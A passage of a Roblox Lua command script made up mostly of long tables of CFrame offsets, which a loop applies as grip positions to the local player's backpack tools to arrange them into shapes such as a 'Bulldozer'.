CFrame.new(3.299999713897705, 1.900000810623169, -3),
CFrame.new(-0.20000000298023224, 0.900000274181366, -1.5),
CFrame.new(0.800000011920929, 0.900000274181366, -3.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -3.5),
CFrame.new(2.799999713897705, 1.9000003337860107, 0.8000001907348633),
CFrame.new(2.299999952316284, -2.0999996662139893, -0.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -4.5),
CFrame.new(3.799999952316284, 2.000000238418579, -4.100000381469727),
CFrame.new(0.30000001192092896, -3.0999996662139893, -6.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -4),
CFrame.new(2.299999952316284, -2.0999996662139893, -2),
CFrame.new(0.30000001192092896, -0.599999725818634, -4),
CFrame.new(0.30000001192092896, 1.9000003337860107, -1.5),
CFrame.new(1.799999713897705, 0.900000274181366, -3),
CFrame.new(3.799999952316284, 2.4000003337860107, -0.20000028610229492),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -6),
CFrame.new(1.2999999523162842, -0.09999972581863403, -2),
CFrame.new(0.800000011920929, -0.09999972581863403, -4),
CFrame.new(2.299999952316284, -0.599999725818634, -1.5),
CFrame.new(-0.699999988079071, 2.799999952316284, 0.19999980926513672),
CFrame.new(0.30000001192092896, -0.599999725818634, -2.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -4.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -3),
CFrame.new(0.30000001192092896, -2.0999996662139893, 0),
CFrame.new(3.799999952316284, 2.8000004291534424, -7.300000190734863),
CFrame.new(1.3000001907348633, -3.0999996662139893, -3),
CFrame.new(1.2999999523162842, 1.9000003337860107, -1),
CFrame.new(0.30000001192092896, -2.0999996662139893, -2),
CFrame.new(0.800000011920929, -0.09999972581863403, 0.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, 0),
CFrame.new(-0.20000000298023224, -0.09999972581863403, 0.5),
CFrame.new(3.799999952316284, 2.200000524520874, -7.40000057220459),
CFrame.new(1.7999999523162842, -0.09999972581863403, -0.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -5),
CFrame.new(3.299999952316284, -1.0999994277954102, -0.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -2.5),
CFrame.new(1.2999999523162842, 1.9000003337860107, -6.5),
CFrame.new(3.799999952316284, 2.8000004291534424, 0.8999996185302734),
CFrame.new(1.2999999523162842, -0.09999972581863403, -2.5),
CFrame.new(0.800000011920929, -2.5999996662139893, 0),
CFrame.new(1.3000001907348633, -3.0999996662139893, -6),
CFrame.new(1.2999999523162842, -1.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -1.1999998092651367),
CFrame.new(1.799999713897705, 1.9000003337860107, 0),
CFrame.new(-0.20000000298023224, 0.900000274181366, -7),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -5),
CFrame.new(3.299999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.299999952316284, -0.09999972581863403, 0.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -7),
CFrame.new(3.799999952316284, 1.900000810623169, 0.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -1),
CFrame.new(2.3000001907348633, -2.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -2.700000286102295),
CFrame.new(1.7999999523162842, -2.5999996662139893, -1),
CFrame.new(3.299999952316284, -3.099999189376831, -7),
CFrame.new(1.7999999523162842, -2.5999996662139893, -4),
CFrame.new(1.3000001907348633, -3.0999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.8000004291534424, -2.3000001907348633),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -1.5),
CFrame.new(3.299999952316284, 0.900000274181366, -5.5),
CFrame.new(2.299999713897705, 0.900000274181366, -1),
CFrame.new(0.800000011920929, 1.9000003337860107, 0),
CFrame.new(3.299999952316284, -0.599999725818634, -3),
CFrame.new(1.2999999523162842, -1.5999996662139893, 0.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -3.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -7.700000762939453),
CFrame.new(-0.699999988079071, 2.000000238418579, -6.600000381469727),
CFrame.new(0.30000001192092896, -0.599999725818634, -2),
CFrame.new(2.299999713897705, 0.900000274181366, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -2.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -1.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -2.5),
CFrame.new(2.299999713897705, 0.900000274181366, 0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, -7),
CFrame.new(0.800000011920929, 0.900000274181366, -1),
CFrame.new(-0.20000000298023224, -0.599999725818634, 0),
CFrame.new(0.800000011920929, -0.09999972581863403, -1.5),
CFrame.new(1.300000548362732, -4.599999904632568, 0.6999998092651367),
CFrame.new(2.799999952316284, -1.5999996662139893, -7),
CFrame.new(1.799999713897705, 1.9000003337860107, -4),
CFrame.new(3.799999952316284, 2.200000524520874, -4),
CFrame.new(3.299999952316284, -0.599999725818634, -6),
CFrame.new(-0.20000000298023224, -0.599999725818634, -0.5),
CFrame.new(2.299999952316284, -0.599999725818634, -5.5),
CFrame.new(2.799999952316284, 0.900000274181366, -3),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -2.5),
CFrame.new(3.299999952316284, -0.09999972581863403, -3.5),
CFrame.new(3.799999952316284, 2.9000003337860107, 0.5999999046325684),
CFrame.new(0.3999994397163391, 1.9000003337860107, 1.1999998092651367),
CFrame.new(3.299999952316284, -0.599999725818634, -0.5),
CFrame.new(0.30000001192092896, -0.09999972581863403, -5.5),
CFrame.new(2.799999952316284, -0.599999725818634, -7),
CFrame.new(0.800000011920929, -3.0999996662139893, -6.5),
CFrame.new(0.800000011920929, -2.5999996662139893, -4),
CFrame.new(1.7999999523162842, -0.09999972581863403, -6.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -7),
CFrame.new(3.299999952316284, -0.09999972581863403, -2.5),
CFrame.new(2.299999952316284, -0.599999725818634, -2),
CFrame.new(-0.20000000298023224, -0.599999725818634, -6.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -1),
CFrame.new(3.299999952316284, -1.0999994277954102, -1.5),
CFrame.new(0.800000011920929, 1.9000003337860107, -1),
CFrame.new(1.1500003337860107, -0.30000001192092896, 1.0500001907348633),
CFrame.new(-0.20000000298023224, 0.900000274181366, 0.5),
CFrame.new(0.30000001192092896, -0.599999725818634, 0.5),
CFrame.new(3.299999952316284, -0.599999725818634, 0),
CFrame.new(2.799999952316284, -0.09999972581863403, -0.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, 0.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -2),
CFrame.new(1.3000001907348633, -3.0999996662139893, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -2.5),
CFrame.new(1.7999999523162842, -0.599999725818634, -2),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -5.5),
CFrame.new(0.800000011920929, -0.09999972581863403, -1),
CFrame.new(-0.699999988079071, 2.8999998569488525, -4.399999618530273),
CFrame.new(2.799999713897705, 1.9000003337860107, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -3.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -4.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, 0.5),
CFrame.new(-0.20000000298023224, 1.8999998569488525, 0),
CFrame.new(2.299999952316284, -0.599999725818634, -1),
CFrame.new(1.2999999523162842, 0.900000274181366, -2.5),
CFrame.new(2.299999713897705, 2.4000003337860107, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -3),
CFrame.new(0.800000011920929, -0.599999725818634, -6.5),
CFrame.new(2.799999713897705, 1.9000003337860107, -6),
CFrame.new(0.30000001192092896, -0.599999725818634, -3.5),
CFrame.new(-0.20000000298023224, 0.900000274181366, -4.5),
CFrame.new(3.799999952316284, 2.000000238418579, 0.8999996185302734),
CFrame.new(2.799999952316284, -0.09999972581863403, -3.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -3.5),
CFrame.new(2.299999713897705, 0.900000274181366, -5),
CFrame.new(2.8000001907348633, -3.0999996662139893, -6.5),
CFrame.new(2.799999952316284, -0.599999725818634, -3.5),
CFrame.new(-0.20000000298023224, -0.599999725818634, -2.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -4),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -4),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -7),
CFrame.new(1.799999713897705, 2.4000003337860107, -7),
CFrame.new(0.800000011920929, 1.9000003337860107, -6),
CFrame.new(2.799999952316284, -1.5999996662139893, -5.5),
CFrame.new(3.799999952316284, 1.900000810623169, -2),
CFrame.new(1.7999999523162842, -1.5999996662139893, -6),
CFrame.new(0.30000001192092896, 0.900000274181366, -2.5),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5.5),
CFrame.new(-0.699999988079071, 2.799999952316284, 0.8999996185302734),
CFrame.new(-0.699999988079071, 2.3999998569488525, -5.200000762939453),
CFrame.new(3.299999952316284, 0.900000274181366, -3.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -2.5),
CFrame.new(1.8499996662139893, -0.30000001192092896, 1.0500001907348633),
CFrame.new(1.3000001907348633, -3.0999996662139893, -1),
CFrame.new(3.799999952316284, 2.8000004291534424, -1.6000003814697266),
CFrame.new(0.800000011920929, 0.900000274181366, -5.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -0.5),
CFrame.new(3.299999952316284, -1.5999994277954102, -5.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, -3),
CFrame.new(-0.20000000298023224, -0.599999725818634, -3),
CFrame.new(2.299999713897705, 0.900000274181366, -3),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5),
CFrame.new(3.299999952316284, -0.599999725818634, -4),
CFrame.new(1.8000001907348633, -3.0999996662139893, -6.5),
CFrame.new(1.3000001907348633, -3.0999996662139893, -4),
CFrame.new(-0.20000000298023224, 0.900000274181366, 0),
CFrame.new(1.2999999523162842, -1.5999996662139893, -5),
CFrame.new(1.2999999523162842, 0.900000274181366, -3),
CFrame.new(-0.699999988079071, 2.8999998569488525, -1.9000000953674316),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -1.5999996662139893, -5),
CFrame.new(2.299999952316284, -0.599999725818634, -0.5),
CFrame.new(1.2999999523162842, -0.09999972581863403, -6.5),
CFrame.new(1.2999999523162842, 0.900000274181366, -6),
CFrame.new(2.299999952316284, -0.599999725818634, 0.5),
CFrame.new(0.30000001192092896, 1.9000003337860107, -4.5),
CFrame.new(0.30000001192092896, 0.900000274181366, -3.5),
CFrame.new(2.799999952316284, -2.5999996662139893, -7),
CFrame.new(3.299999713897705, 2.400000810623169, -2),
CFrame.new(2.299999952316284, -2.0999996662139893, -3.5),
CFrame.new(3.299999713897705, 1.900000810623169, 0.5),
CFrame.new(-0.699999988079071, 2.5999996662139893, -1.5),
CFrame.new(0.30000001192092896, -2.5999996662139893, -7),
CFrame.new(3.799999952316284, 2.8000004291534424, -4.800000190734863),
CFrame.new(1.7999999523162842, -2.5999996662139893, -5),
CFrame.new(0.800000011920929, -2.5999996662139893, -5),
CFrame.new(0.30000001192092896, -0.599999725818634, -1.5),
CFrame.new(3.299999952316284, -2.5999996662139893, -5),
CFrame.new(2.3000001907348633, -2.5999996662139893, -5),
CFrame.new(2.799999713897705, 1.9000003337860107, -6.5),
CFrame.new(1.7999999523162842, -2.5999996662139893, -3.5),
CFrame.new(2.299999713897705, 0.900000274181366, -6.5),
CFrame.new(-0.699999988079071, 2.3999998569488525, -3.6999998092651367),
CFrame.new(2.3000001907348633, -3.0999996662139893, -5.5),
CFrame.new(2.799999952316284, -0.09999972581863403, -7),
CFrame.new(3.799999952316284, 2.6000006198883057, -6.5),
CFrame.new(0.30000001192092896, -0.599999725818634, 0),
CFrame.new(-0.699999988079071, 2.5999996662139893, -7.399999618530273),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -3),
CFrame.new(-0.20000000298023224, -0.599999725818634, -2),
CFrame.new(0.800000011920929, 1.9000003337860107, -3.5),
CFrame.new(3.799999952316284, 2.4000003337860107, -5.200000762939453),
CFrame.new(-0.699999988079071, 2.000000238418579, -4.800000190734863),
CFrame.new(3.799999952316284, 2.000000238418579, -4.800000190734863),
CFrame.new(1.1500003337860107, -1.0999996662139893, 1.0500001907348633),
CFrame.new(-0.699999988079071, 2.3999998569488525, -7.700000762939453),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -0.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -7),
CFrame.new(3.299999952316284, 0.900000274181366, -2.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -6),
CFrame.new(3.299999952316284, -1.0999994277954102, -3),
CFrame.new(0.800000011920929, -3.0999996662139893, -6),
CFrame.new(2.299999952316284, -0.09999972581863403, -3.5),
CFrame.new(3.299999952316284, -0.599999725818634, 0.5),
CFrame.new(1.799999713897705, 0.900000274181366, -7),
CFrame.new(0.800000011920929, -0.599999725818634, -4.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -7),
CFrame.new(3.799999952316284, 2.4000003337860107, -2.700000286102295),
CFrame.new(1.2999999523162842, -0.599999725818634, -5.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -5.5),
CFrame.new(1.799999713897705, 0.900000274181366, 0.5),
CFrame.new(3.299999952316284, -1.0999994277954102, -4.5),
CFrame.new(-0.20000000298023224, -0.09999972581863403, -7),
CFrame.new(2.299999713897705, 1.9000003337860107, -4),
CFrame.new(-0.20000000298023224, -1.5999999046325684, -5),
CFrame.new(3.799999952316284, 2.6000006198883057, -4),
CFrame.new(0.30000001192092896, -0.09999972581863403, -6),
CFrame.new(2.299999952316284, -2.0999996662139893, 0.5),
CFrame.new(2.799999952316284, -1.5999996662139893, -1.5),
CFrame.new(1.2999999523162842, -0.599999725818634, -3),
CFrame.new(3.299999952316284, -1.0999994277954102, 0),
CFrame.new(0.800000011920929, 1.9000003337860107, -2),
CFrame.new(2.799999713897705, 1.9000003337860107, 0),
CFrame.new(0.30000001192092896, -0.09999972581863403, -3),
CFrame.new(1.7999999523162842, -2.5999996662139893, -2.5),
CFrame.new(2.299999713897705, 1.9000003337860107, -6.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -7),
CFrame.new(-0.699999988079071, 2.3999998569488525, -0.20000028610229492),
CFrame.new(0.30000001192092896, 2.4000003337860107, -2),
CFrame.new(0.800000011920929, -1.5999996662139893, -6.5),
CFrame.new(3.799999952316284, 2.6000006198883057, -1.5),
CFrame.new(-0.20000000298023224, -3.1000001430511475, -6.5),
CFrame.new(0.800000011920929, -0.599999725818634, -5.5),
CFrame.new(1.2999999523162842, 2.4000003337860107, -2),
CFrame.new(2.299999713897705, 2.4000003337860107, -4.5),
CFrame.new(1.799999713897705, 1.9000003337860107, -7),
CFrame.new(0.30000001192092896, 1.9000003337860107, -6.5),
CFrame.new(2.299999952316284, -0.09999972581863403, -0.5),
CFrame.new(-0.20000000298023224, 2.3999998569488525, -2),
CFrame.new(0.800000011920929, -0.599999725818634, -2.5),
CFrame.new(1.799999713897705, 0.900000274181366, -1.5),
CFrame.new(1.7999999523162842, -0.09999972581863403, 0),
CFrame.new(0.800000011920929, -2.5999996662139893, -2.5),
CFrame.new(1.7999999523162842, -1.5999996662139893, -5.5),
CFrame.new(3.799999952316284, 2.000000238418579, -6.600000381469727),
CFrame.new(-0.20000000298023224, 1.8999998569488525, -1.5),
CFrame.new(2.799999952316284, 0.900000274181366, -5.5),
CFrame.new(0.30000001192092896, -2.0999996662139893, -1.5),
CFrame.new(3.299999952316284, -2.5999996662139893, -7),

}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 
end)
AddCmd('Bulldozer','',function()

local Handles = {
CFrame.new(2.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(0.23483513295650482, 1.5000009536743164, -0.23483578860759735),
CFrame.new(1.2348361015319824, -4.999999046325684, -7.234835624694824),
CFrame.new(3.134834051132202, 1.6705914735794067, 5.682201385498047),
CFrame.new(3.734832525253296, 3.0000009536743164, -1.234834909439087),
CFrame.new(-0.7651630640029907, -5, -2.734834909439087),
CFrame.new(2.7348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(-0.265164852142334, 1.5000004768371582, -2.234834909439087),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -1.2348353862762451),
CFrame.new(2.134834051132202, 1.9294102191925049, 7.148129940032959),
CFrame.new(5.234833717346191, 1.5000015497207642, -3.234834671020508),
CFrame.new(4.234834671020508, -0.49999773502349854, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.5000002384185791, 0.7651643753051758),
CFrame.new(1.2348361015319824, -2.9999992847442627, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999998569488525, -7.234835624694824),
CFrame.new(-1.265164852142334, -0.49999916553497314, -3.234834909439087),
CFrame.new(1.134833812713623, 1.9294102191925049, 8.648130416870117),
CFrame.new(2.7348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(0.23483513295650482, -1.4999996423721313, -4.734834671020508),
CFrame.new(4.734834671020508, -0.9999987483024597, 1.7651644945144653),
CFrame.new(2.2348344326019287, 0.5, -1.2348353862762451),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.234834671020508, -0.49999725818634033, -3.234834909439087),
CFrame.new(5.734835624694824, -2.6999971866607666, -0.8348362445831299),
CFrame.new(1.2348361015319824, -3.2928929328918457, -8.941941261291504),
CFrame.new(-2.265164613723755, 2.4999992847442627, -2.234834671020508),
CFrame.new(-1.7651629447937012, -2.500000238418579, -0.23483578860759735),
CFrame.new(0.23483608663082123, -2.999999761581421, -3.234834909439087),
CFrame.new(-2.265162706375122, -5.000000476837158, -4.234835624694824),
CFrame.new(5.734832763671875, 3.000001907348633, 0.7651643753051758),
CFrame.new(-1.765164852142334, 2.4999992847442627, -0.23483578860759735),
CFrame.new(4.234834671020508, 1.5000009536743164, -4.234834671020508),
CFrame.new(5.234836578369141, -4.999998092651367, -2.734834909439087),
CFrame.new(4.234834671020508, -0.49999773502349854, -4.234835624694824),
CFrame.new(-2.265162706375122, -5.000000476837158, -6.234835624694824),
CFrame.new(4.234834671020508, 2.0000011920928955, 4.765165328979492),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -3.234834909439087),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -4.234834671020508),
CFrame.new(4.234834671020508, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.234834671020508, 0.5000019073486328, 2.7651655673980713),
CFrame.new(4.734834671020508, 1.000001311302185, 0.7651643753051758),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(1.7348361015319824, -5, -4.234835624694824),
CFrame.new(5.234834671020508, -1.999997854232788, -3.234834909439087),
CFrame.new(5.734834671020508, -0.49999797344207764, -8.734833717346191),
CFrame.new(0.7348340749740601, 1.5, 1.7651644945144653),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -0.8348362445831299),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.234834909439087),
CFrame.new(0.23483513295650482, 1.5000009536743164, -4.234834671020508),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 2.1651651859283447),
CFrame.new(4.234836578369141, -4.999998092651367, -2.734834909439087),
CFrame.new(4.234834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, 4.765165328979492),
CFrame.new(3.2348344326019287, 1.000001311302185, -4.734834671020508),
CFrame.new(-2.265164613723755, 1.4999979734420776, 0.7651643753051758),
CFrame.new(-1.265164852142334, 0.5000007152557373, -3.234834909439087),
CFrame.new(-1.265164852142334, -0.49999964237213135, 1.7651644945144653),
CFrame.new(-1.765164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.000000238418579, -4.234835624694824),
CFrame.new(4.234836578369141, -2.9999983310699463, -4.234835624694824),
CFrame.new(-2.7651665210723877, 2.9999983310699463, -1.234834909439087),
CFrame.new(5.234834671020508, -0.9999977946281433, -4.734834671020508),
CFrame.new(-0.7651668787002563, 2.9999988079071045, 0.7651643753051758),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.234834909439087),
CFrame.new(1.2348361015319824, -1.9999992847442627, -4.734835624694824),
CFrame.new(3.7348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 2.765164613723755),
CFrame.new(4.734833717346191, 2.5000011920928955, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -1.000001072883606, 2.765164613723755),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -1.8348363637924194),
CFrame.new(3.2348344326019287, -0.9999987483024597, -4.734834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -3.234834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, -2.234834671020508),
CFrame.new(5.734833717346191, 1.0000015497207642, 2.765164613723755),
CFrame.new(-0.7651630640029907, -2.999999761581421, -8.734833717346191),
CFrame.new(0.23483704030513763, -5, -2.734834909439087),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -0.23483578860759735),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(5.234832763671875, 2.5000011920928955, -3.234834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -0.23483578860759735),
CFrame.new(4.234834671020508, 0.5000028610229492, -3.234834909439087),
CFrame.new(4.234836578369141, -2.4999983310699463, -4.734835624694824),
CFrame.new(1.134833812713623, 1.9294102191925049, 7.648129940032959),
CFrame.new(-0.7651630640029907, -2.000000238418579, -4.734835624694824),
CFrame.new(4.734834671020508, -0.9999982714653015, -0.23483578860759735),
CFrame.new(2.2348363399505615, -3.2928924560546875, -8.941941261291504),
CFrame.new(4.734834671020508, -0.49999821186065674, -4.734834671020508),
CFrame.new(3.734832525253296, 3.0000014305114746, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 2.765164613723755),
CFrame.new(5.234834671020508, -1.4999982118606567, -3.234834909439087),
CFrame.new(-1.265164852142334, 1.999998688697815, 1.7651644945144653),
CFrame.new(4.734834671020508, 0.5000009536743164, 3.2651658058166504),
CFrame.new(2.2348344326019287, 0.5, -1.2348353862762451),
CFrame.new(5.234834671020508, -2.499997854232788, -3.234834909439087),
CFrame.new(4.734834671020508, -0.9999982714653015, -3.234834909439087),
CFrame.new(4.234834671020508, 2.5000011920928955, 2.7651655673980713),
CFrame.new(4.234834671020508, 1.0000008344650269, 3.265164852142334),
CFrame.new(0.23483704030513763, -2.4999992847442627, -4.734835624694824),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 8.648130416870117),
CFrame.new(-1.7651629447937012, -5.000000476837158, -7.234835624694824),
CFrame.new(-1.7651629447937012, -2.500000238418579, -1.2348358631134033),
CFrame.new(-1.765164852142334, 0.9999993443489075, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999999523162842, -3.234835147857666),
CFrame.new(3.7348344326019287, 2, 3.265164852142334),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 0.16516387462615967),
CFrame.new(4.134834289550781, 1.9294111728668213, 7.648129940032959),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -2.234834909439087),
CFrame.new(4.734834671020508, 1.5000015497207642, -3.234834671020508),
CFrame.new(5.234834671020508, -2.4999983310699463, 1.7651644945144653),
CFrame.new(4.234834671020508, 2.5000016689300537, -2.234834671020508),
CFrame.new(0.13483475148677826, 1.9294092655181885, 7.148129940032959),
CFrame.new(5.234834671020508, -1.4999982118606567, -4.234835624694824),
CFrame.new(-0.265164852142334, 1.5000004768371582, -3.2348344326019287),
CFrame.new(4.234834671020508, 2.5000011920928955, 0.7651643753051758),
CFrame.new(1.134833812713623, 0.800000011920929, 5.165163040161133),
CFrame.new(-1.265164852142334, 1.9999991655349731, -0.23483578860759735),
CFrame.new(2.2348363399505615, -2.9999992847442627, -3.734834909439087),
CFrame.new(-1.265164852142334, 1.9999991655349731, -3.234834671020508),
CFrame.new(-1.765164852142334, 0.9999991059303284, -4.234834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(-1.765164852142334, 0.9999986290931702, 1.7651644945144653),
CFrame.new(4.734834671020508, 2.0000016689300537, -4.234834671020508),
CFrame.new(2.134834051132202, 1.9294102191925049, 8.148130416870117),
CFrame.new(4.734834671020508, 1.000001311302185, 1.7651644945144653),
CFrame.new(0.23483704030513763, -4.707106113433838, -7.527728080749512),
CFrame.new(3.2348363399505615, -3.2928919792175293, -8.941941261291504),
CFrame.new(-1.765164852142334, 1.499998927116394, -0.23483578860759735),
CFrame.new(0.23483608663082123, -3.2928929328918457, -8.941941261291504),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 1.1651639938354492),
CFrame.new(1.2348341941833496, 1.5000004768371582, 0.7651643753051758),
CFrame.new(5.734833717346191, 1.0000020265579224, -4.234834671020508),
CFrame.new(1.2348361015319824, -1.4999991655349731, -4.734834671020508),
CFrame.new(-1.7651629447937012, -1.000001072883606, 1.7651644945144653),
CFrame.new(3.734832525253296, 3.0000009536743164, -3.234834671020508),
CFrame.new(2.2348363399505615, -4.999999046325684, -7.234835624694824),
CFrame.new(5.234834671020508, -0.9999982714653015, -2.234834909439087),
CFrame.new(2.2348344326019287, -0.9999992251396179, -4.734834671020508),
CFrame.new(4.234834671020508, 2.5000011920928955, -1.234834909439087),
CFrame.new(0.23483513295650482, 1.5, -1.2348353862762451),
CFrame.new(4.234836578369141, -4.999998092651367, -7.234835624694824),
CFrame.new(1.134833812713623, 1.9294100999832153, 6.648129463195801),
CFrame.new(4.234834671020508, 2.0000011920928955, -2.234834671020508),
CFrame.new(-1.265164852142334, 0.4999997615814209, 2.7651655673980713),
CFrame.new(0.23483608663082123, -2.999999761581421, -3.234834909439087),
CFrame.new(5.734835624694824, -4.353551387786865, -7.881281852722168),
CFrame.new(5.234833717346191, 1.0000020265579224, -4.734834671020508),
CFrame.new(-1.7651629447937012, -3.292893886566162, -8.941941261291504),
CFrame.new(5.734832763671875, 2.5000011920928955, 3.2651658058166504),
CFrame.new(4.234836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-1.265164852142334, 0.9999991059303284, 3.7651658058166504),
CFrame.new(5.234835624694824, -3.292891025543213, -8.941941261291504),
CFrame.new(4.234834671020508, -0.49999773502349854, -2.234835147857666),
CFrame.new(-2.265164613723755, 1.499998927116394, -3.234834671020508),
CFrame.new(-1.7651629447937012, -4.707107067108154, -7.527728080749512),
CFrame.new(3.734832525253296, 3.0000014305114746, -4.234834671020508),
CFrame.new(-2.265164613723755, 1.4999979734420776, 2.7651655673980713),
CFrame.new(-0.7651649713516235, 2.499999761581421, -4.734834671020508),
CFrame.new(-2.765164613723755, 0.9999983906745911, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -5.000000476837158, -5.234834671020508),
CFrame.new(1.2348341941833496, 0.5, -0.7348358035087585),
CFrame.new(3.2348363399505615, -2.9999988079071045, -4.234835624694824),
CFrame.new(1.134833812713623, 1.4294102191925049, 9.148130416870117),
CFrame.new(5.234832763671875, 2.5000011920928955, 0.7651643753051758),
CFrame.new(-1.265164852142334, 2.4999992847442627, 4.265164375305176),
CFrame.new(0.23483513295650482, 1.5, 1.7651644945144653),
CFrame.new(3.134834051132202, 1.429410696029663, 9.148130416870117),
CFrame.new(-1.265164852142334, 0.5000002384185791, -0.23483578860759735),
CFrame.new(4.734834671020508, 0.000001862645149230957, -4.734834671020508),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(0.7348369359970093, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-1.765164852142334, 0.9999986290931702, -1.2348353862762451),
CFrame.new(-2.265162706375122, -4.500001430511475, -3.2348341941833496),
CFrame.new(4.134834289550781, 0.3669886589050293, 4.915163993835449),
CFrame.new(4.234836578369141, -4.707104682922363, -7.527728080749512),
CFrame.new(4.234834671020508, 0.000001862645149230957, 2.765164613723755),
CFrame.new(4.234834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(4.234835624694824, -1.9999983310699463, -4.734835624694824),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-2.265164613723755, 1.9999982118606567, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 0.7651643753051758),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 0.16516387462615967),
CFrame.new(5.234833717346191, 2.0000011920928955, 0.7651643753051758),
CFrame.new(5.234834671020508, -1.4999977350234985, -4.734834671020508),
CFrame.new(1.2348341941833496, 4.3213367462158203e-07, -4.734834671020508),
CFrame.new(-2.765164613723755, 1.9999991655349731, -4.734834671020508),
CFrame.new(4.734833717346191, 2.5000016689300537, -0.23483578860759735),
